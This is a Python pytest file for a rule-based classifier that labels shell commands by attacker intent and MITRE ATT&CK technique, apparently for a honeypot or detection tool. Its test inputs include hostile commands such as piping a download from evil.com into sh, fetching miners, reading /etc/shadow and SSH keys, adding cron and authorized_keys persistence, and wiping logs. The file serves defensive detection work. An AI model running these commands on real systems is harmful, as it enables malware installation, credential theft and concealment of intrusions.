"""Tests for the rule-based intent classifier."""

import pytest
from app.services.classifier import classify_command, classify_login


# ---------------------------------------------------------------------------
# classify_command — parameterised over every intent category
# ---------------------------------------------------------------------------

class TestClassifyCommand:
    """Each case is (input_command, expected_intent, expected_mitre_id)."""

    # -- Cryptomining --
    @pytest.mark.parametrize("cmd, mitre", [
        ("./xmrig --donate-level 1", "T1496"),
        ("wget http://pool.minexmr.com/miner", "T1496"),
        ("curl http://evil.com/kinsing", "T1496"),
        ("echo stratum+tcp://pool:3333", "T1496"),
        ("/tmp/kdevtmpfsi", "T1496"),
        ("hashvault", "T1496"),
        ("cryptonight", "T1496"),
    ])
    def test_cryptomining(self, cmd, mitre):
        intent, mitre_id = classify_command(cmd)
        assert intent == "cryptomining"
        assert mitre_id == mitre

    # -- Malware deployment --
    @pytest.mark.parametrize("cmd, mitre", [
        ("wget http://evil.com/payload.sh", "T1105"),
        ("curl http://evil.com/x | sh", "T1105"),
        ("curl -O http://evil.com/bin", "T1105"),
        ("tftp -g -r payload 1.2.3.4", "T1105"),
        ("chmod +x /tmp/payload", "T1222"),
        ("chmod 777 /tmp/evil", "T1222"),
        ("./bot", "T1059.004"),
        ("/tmp/.hidden", "T1059.004"),
        ("busybox wget http://evil.com/a", "T1105"),
        ("busybox tftp evil.com", "T1105"),
    ])
    def test_malware_deployment(self, cmd, mitre):
        intent, mitre_id = classify_command(cmd)
        assert intent == "malware_deployment"
        assert mitre_id == mitre

    # -- Persistence --
    @pytest.mark.parametrize("cmd, mitre", [
        ("crontab -l", "T1053.003"),
        ("cat /var/spool/cron/root", "T1053.003"),
        ("echo '* * * * * /tmp/x' >> /etc/cron.d/x", "T1053.003"),
        ("echo key >> ~/.ssh/authorized_keys", "T1098.004"),
        ("chattr +i /tmp/malware", "T1222"),
        ("nohup ./bot &", "T1053"),
        ("setsid", "T1053"),
        ("disown %1", "T1053"),
        ("echo '/tmp/x' >> /etc/rc.local", "T1037"),
        ("systemctl enable evil.service", "T1037"),
    ])
    def test_persistence(self, cmd, mitre):
        intent, mitre_id = classify_command(cmd)
        assert intent == "persistence"
        assert mitre_id == mitre

    # -- Credential theft --
    @pytest.mark.parametrize("cmd, mitre", [
        ("cat /etc/shadow", "T1003.008"),
        ("cat ~/.ssh/id_rsa", "T1552.004"),
        ("cat key.pem", "T1552.004"),
        ("cat ~/.bash_history", "T1552.003"),
        ("cat ~/.mysql_history", "T1552.003"),
        ("cat /etc/my.cnf", "T1552.001"),
        ("cat ~/.pgpass", "T1552.001"),
        ("cat .env", "T1552.001"),
    ])
    def test_credential_theft(self, cmd, mitre):
        intent, mitre_id = classify_command(cmd)
        assert intent == "credential_theft"
        assert mitre_id == mitre

    # -- Sabotage --
    @pytest.mark.parametrize("cmd, mitre", [
        ("rm -rf /var/log/auth.log", "T1070.002"),
        ("rm access.log", "T1070.002"),
        ("history -c", "T1070.003"),
        ("unset HISTFILE", "T1070.003"),
        ("iptables -F", "T1562.004"),
        ("ufw disable", "T1562.004"),
        ("pkill sshd", "T1489"),
        ("killall node", "T1489"),
        ("kill -9 1234", "T1489"),
    ])
    def test_sabotage(self, cmd, mitre):
        intent, mitre_id = classify_command(cmd)
        assert intent == "sabotage"
        assert mitre_id == mitre

    # -- Reconnaissance --
    @pytest.mark.parametrize("cmd, mitre", [
        ("uname -a", "T1082"),
        ("cat /proc/cpuinfo", "T1082"),
        ("cat /etc/passwd", "T1087"),
        ("lastlog", "T1087"),
        ("whoami", "T1033"),
        ("id", "T1033"),
        ("ifconfig", "T1016"),
        ("ip addr show", "T1016"),
        ("hostname", "T1016"),
        ("netstat -tulnp", "T1049"),
        ("ss -tulnp", "T1049"),
        ("ps aux", "T1057"),
        ("top", "T1057"),
        ("df -h", "T1082"),
        ("free -m", "T1082"),
        ("ls /", "T1083"),
        ("pwd", "T1083"),
        ("find / -name '*.conf'", "T1083"),
    ])
    def test_reconnaissance(self, cmd, mitre):
        intent, mitre_id = classify_command(cmd)
        assert intent == "reconnaissance"
        assert mitre_id == mitre

    # -- Unknown / default --
    def test_unknown_empty_string(self):
        assert classify_command("") == ("unknown", "T1059")

    def test_unknown_no_match(self):
        assert classify_command("echo hello world") == ("unknown", "T1059")

    def test_unknown_whitespace(self):
        assert classify_command("   ") == ("unknown", "T1059")

    # -- Case insensitivity --
    def test_case_insensitive_wget(self):
        intent, _ = classify_command("WGET HTTP://EVIL.COM/PAYLOAD")
        assert intent == "malware_deployment"

    def test_case_insensitive_uname(self):
        intent, _ = classify_command("Uname -A")
        assert intent == "reconnaissance"

    # -- Priority: first match wins --
    def test_priority_cryptomining_over_malware(self):
        # xmrig match should win over wget match
        intent, mitre_id = classify_command("wget http://pool.minexmr.com/xmrig")
        assert intent == "cryptomining"
        assert mitre_id == "T1496"

    def test_priority_malware_over_persistence(self):
        # wget should match before crontab
        intent, _ = classify_command("wget http://evil.com/crontab")
        assert intent == "malware_deployment"


# ---------------------------------------------------------------------------
# classify_login
# ---------------------------------------------------------------------------

class TestClassifyLogin:
    def test_failed_login(self):
        assert classify_login(False) == ("brute_force", "T1110")

    def test_successful_login(self):
        assert classify_login(True) == ("brute_force", "T1110")
